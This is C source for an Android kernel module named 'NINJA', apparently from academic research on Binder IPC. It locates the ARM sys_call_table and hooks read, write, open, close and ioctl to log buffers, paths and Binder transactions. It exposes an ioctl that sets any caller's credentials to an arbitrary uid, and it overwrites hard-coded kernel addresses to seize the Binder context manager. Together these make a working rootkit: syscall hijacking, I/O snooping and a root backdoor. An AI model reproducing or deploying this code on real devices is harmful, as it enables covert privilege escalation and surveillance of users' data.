#include "ninja.h"

static int major;
static void **sys_call_table;
static int *orig_svc_mgr_node;

int init_module() {
	major = register_chrdev(0, "ninja", &fops);

	get_sys_call_table();
	orig_read = sys_call_table[SYS_READ];
	orig_write = sys_call_table[SYS_WRITE];
	orig_open = sys_call_table[SYS_OPEN];
	orig_close = sys_call_table[SYS_CLOSE];
	orig_ioctl = sys_call_table[SYS_IOCTL];

	if (major < 0)
		printk("NINJA failed to register.\n");

	printk("NINJA in, major %d\n", major);
	return 0;
}

void cleanup_module() {
	sys_call_table[SYS_READ] = orig_read;
	sys_call_table[SYS_WRITE] = orig_write;
	sys_call_table[SYS_OPEN] = orig_open;
	sys_call_table[SYS_CLOSE] = orig_close;
	sys_call_table[SYS_IOCTL] = orig_ioctl;

	unregister_chrdev(major, "ninja");
	printk("NINJA out\n");
}

int ninja_open(struct inode *inode, struct file *file) {
	printk("NINJA open\n");
	try_module_get(THIS_MODULE);
	return 0;
}

int ninja_ioctl(struct inode *inode, struct file *file, unsigned int ioctl_num, unsigned long ioctl_param) {
	if (ioctl_num == IOCTL_UID) {
		return setuid(ioctl_param);
	} else if (ioctl_num == IOCTL_SYS_CALL) {
		hook_syscall(ioctl_param);
		return 0;
	} else if (ioctl_num == IOCTL_CLR_CTX_MNG) {
		clear_ctx_mgr();
		return 0;
	} else if (ioctl_num == IOCTL_SWT_CTX_MNG) {
		switch_ctx_mgr();
		return 0;
	} else if (ioctl_num == IOCTL_LOG_STRING) {
		stringlog((char *)ioctl_param);
		return 0;
	} else if (ioctl_num == IOCTL_LOG_INT) {
		intlog((int)ioctl_param);
		return 0;
	} else {
		printk("NINJA has no such ioctl call\n");
		return -1;
	}
}

int ninja_release(struct inode *inode, struct file *file) {
	printk("NINJA release\n");
	module_put(THIS_MODULE);
	return 0;
}

void stringlog(char *msg) {
	printk("%s", msg);
}

void intlog(int i) {
	printk("%d", i);
}

void hook_syscall(int syscall) {
	printk("NINJA syscall %d\n", syscall);
	switch(syscall) {
	case SYS_READ:
		sys_call_table[SYS_READ] = our_read;
	break;
	case SYS_WRITE:
		sys_call_table[SYS_WRITE] = our_write;
	break;
	case SYS_OPEN:
		sys_call_table[SYS_OPEN] = our_open;
	break;
	case SYS_CLOSE:
		sys_call_table[SYS_CLOSE] = our_close;
	break;
	case SYS_IOCTL:
		sys_call_table[SYS_IOCTL] = our_ioctl;
	break;
	}
}

asmlinkage ssize_t our_read(int fd, char *buf, size_t count) {
        printk("NINJA hooked read: %s\n", buf);
        return orig_read(fd, buf, count);
}

asmlinkage ssize_t our_write(int fd, char *buf, size_t count) {
	printk("NINJA hooked write: %s\n", buf);
	return orig_write(fd, buf, count);
}

asmlinkage ssize_t our_open(const char *pathname, int flags) {
	printk("NINJA hooked open: %s\n", pathname);
	return orig_open(pathname, flags);
}

asmlinkage ssize_t our_close(int fd) {
        printk("NINJA hooked closed: %s\n", current->comm);
        return orig_close(fd);
}

void bio_init_from_txn(struct binder_io *bio, struct binder_txn *txn)
{
	bio->data = bio->data0 = txn->data;
	bio->offs = bio->offs0 = txn->offs;
	bio->data_avail = txn->data_size;
	bio->offs_avail = txn->offs_size / 4;
	bio->flags = BIO_F_SHARED;
}

void *bio_get(struct binder_io *bio, uint32_t size)
{
	size = (size + 3) & (~3);

	if (bio->data_avail < size){
		bio->data_avail = 0;
		bio->flags |= BIO_F_OVERFLOW;
		return 0;
	}  else {
		void *ptr = bio->data;
		bio->data += size;
		bio->data_avail -= size;
		return ptr;
	}
}

uint32_t bio_get_uint32(struct binder_io *bio)
{
	uint32_t *ptr = bio_get(bio, sizeof(*ptr));
	return ptr ? *ptr : 0;
}

uint16_t *bio_get_string16(struct binder_io *bio, unsigned *sz)
{
	unsigned len;
	len = bio_get_uint32(bio);
	if (sz)
		*sz = len;
	return bio_get(bio, (len + 1) * sizeof(uint16_t));
}

asmlinkage ssize_t our_ioctl(unsigned int fd, unsigned int cmd, unsigned long arg) {
	struct binder_write_read *bwr;
	uint32_t *data;
	struct binder_txn *txn;
	struct binder_io msg;
	int len = 0, i;
	int num;
	uint16_t *s;

	if (cmd == BINDER_WRITE_READ) {

		bwr = (struct binder_write_read *)arg;

		if (bwr->write_size != 0) {
			data = (uint32_t *)(bwr->write_buffer);
			
			switch (*data) {
			case BC_REPLY:
txn = (struct binder_txn *)(++data);
bio_init_from_txn(&msg, txn);
num = bio_get_uint32(&msg);
		if (num != -1 /*&& msg.data_avail != 168*/)
			break;
				printk("from: %s\n", current->comm);
				printk("BC_REPLY\n");

				printk("msg.data_avail: %d\n", msg.data_avail);
				printk("msg.offs_avail: %d\n", msg.offs_avail);
				
				printk("a replay number: %d\n", num);
				/*if (num == -1) {
					msg.data[-1] = 0;
					msg.data[-2] = 0;
					msg.data[-3] = 0;
					msg.data[-4] = 0;
				}*/
			/*num = bio_get_uint32(&msg);
				printk("a replay number: %d\n", num);*/
/*
				s = bio_get_string16(&msg, &len);
				for (i = 0; i < len; i++)
            				printk("%s", (char *)&(s[i]));
				printk("\n");
num = bio_get_uint32(&msg);
				printk("a replay number: %d\n", num);
num = bio_get_uint32(&msg);
				printk("a replay number: %d\n", num);
num = bio_get_uint32(&msg);
				printk("a replay number: %d\n", num);
s = bio_get_string16(&msg, &len);
				for (i = 0; i < len; i++)
            				printk("%s", (char *)&(s[i]));
				printk("\n");
s = bio_get_string16(&msg, &len);
				for (i = 0; i < len; i++)
            				printk("%s", (char *)&(s[i]));
				printk("\n");
s = bio_get_string16(&msg, &len);
				for (i = 0; i < len; i++)
            				printk("%s", (char *)&(s[i]));
				printk("\n");*/
/*for (i = 0; i < 26; i++) {
				num = bio_get_uint32(&msg);
				printk("a replay number: %d\n", num);
}				//printk("\n");
//if (msg.data_avail == 168) {
				
				

			*/	
//}

			break;
			case BC_FREE_BUFFER:
				//printk("\tBC_FREE_BUFFER\n");
			break;
			case BC_TRANSACTION:
				txn = (struct binder_txn *)(++data);
				
				printk("from: %s\n", current->comm);
				printk("BC_TRANSACTION\n");

				
				printk("txn->target: %d\n", (int)txn->target);
				printk("txn->code: %d\n", txn->code);
				
				/*bio_init_from_txn(&msg, txn);
				printk("msg.data_avail: %d\n", msg.data_avail);
				printk("msg.offs_avail: %d\n", msg.offs_avail);

				bio_get_uint32(&msg); //an unused int
				s = bio_get_string16(&msg, &len);

				printk("to: ");
				for (i = 0; i < len; i++)
            				printk("%s", (char *)&(s[i]));
				printk("\n\n");*/
			break;
			//default:
				//printk("write_default: %d\n", *data);
				//printk("write_size: %d\n", (int)bwr->write_size);
			}
		}

		if (bwr->read_size != 0) {
			data = (uint32_t *)(bwr->read_buffer);
			
			switch (*data) {
			case BR_NOOP:
				//printk("\tBR_NOOP\n");
				//printk("\t\tread_size: %d\n", bwr->read_size);
				//printk("\t\tread_buf: %p\n", bwr->read_buffer);
//for (i = 0; i < 64; i++)
//	printk("data + %d: %d\n", i*4, *(data + i*4));
//printk("///////////////////////////////////////////////////////////////////\n\n");
			break;
			default:
				printk("current->comm: %s\n", current->comm);
				printk("\tread_default: %d\n", *data);
				printk("\t\tread_size: %d\n", (int)bwr->read_size);
				printk("\t\tread_buf: %p\n", bwr->read_buffer);
//for (i = 0; i < 64; i++)
//	printk("data + %d: %d\n", i*4, *(data + i*4));
//printk("///////////////////////////////////////////////////////////////////\n\n");
/*printk("data + 4: %d\n", *(data + 4));
txn = (struct binder_txn *)(data + 4);
//bio_init_from_txn(&msg, txn);
//num = bio_get_uint32(&msg);
printk("target: %d\n", txn->target);
printk("cookie: %d\n", txn->cookie);
printk("code: %d\n", txn->code);
printk("flags: %d\n", txn->flags);
printk("sender_pid: %d\n", txn->sender_pid);
printk("sender_euid: %d\n", txn->sender_euid);
printk("data_size: %d\n", txn->data_size);
printk("offs_size: %d\n", txn->offs_size);
printk("data: %d\n", txn->data);
printk("offs: %d\n", txn->offs);
if (txn->sender_euid == 1000)
	printk("first data: %d\n", *(int *)(txn->data));
printk("\n");*/
			}
		}
	}

        return orig_ioctl(fd, cmd, arg);
}

void clear_ctx_mgr(void) {
	int *svc_mgr_node = (int *)0xc038f720;
	int *svc_mgr_uid = (int *)0xc03651d8;

	printk("NINJA becoming the context manager\n");
	
	orig_svc_mgr_node = (int *)(*svc_mgr_node);
	*svc_mgr_node = 0;
	*svc_mgr_uid = -1;
}

//Not currently in use, will be if we want to revert the ctx mgr.
void switch_ctx_mgr(void) {
	int *svc_mgr_node = (int *)0xc038f720;
	int *temp = (int *)(*svc_mgr_node);

	printk("NINJA switching the context manager\n");

	*svc_mgr_node = (int)orig_svc_mgr_node;
	orig_svc_mgr_node = (int *)(*temp);
}

int setuid(int uid) {
	struct cred *new;

	printk("NINJA setuid\n");

	new = prepare_creds();
	new->suid = new->uid = uid;
	new->fsuid = new->euid = uid;
	return commit_creds(new);
}

//author: Hitesh Dharmdasani <hdharmda@gmu.edu>
/* Get the address of sys_call_table as a pointer. All further references are through indexing this pointer */
void get_sys_call_table(){
	// Interrupt tables are loaded in high memory in android starting at 0xffff0000
	void *swi_table_addr=(long *)0xffff0008; // Known address of Software Interrupt handler
	unsigned long offset_from_swi_vector_adr=0;
	unsigned long *swi_vector_adr=0;

	offset_from_swi_vector_adr=((*(long *)swi_table_addr)&0xfff)+8; 
	swi_vector_adr=(unsigned long *)*(unsigned long *)(swi_table_addr+offset_from_swi_vector_adr); 

	while(swi_vector_adr++){
		// Copy the entire sys_call_table from the offset_from_swi_vector_adr starting the hardware interrupt table
		if(((*(unsigned long *)swi_vector_adr)&0xfffff000)==0xe28f8000){ 
			// 0xe28f8000 is end of interrupt space. Hence we stop.
			offset_from_swi_vector_adr=((*(unsigned long *)swi_vector_adr)&0xfff)+8;
			sys_call_table=(void *)swi_vector_adr+offset_from_swi_vector_adr;
			break;
		}
	}
	return;
}
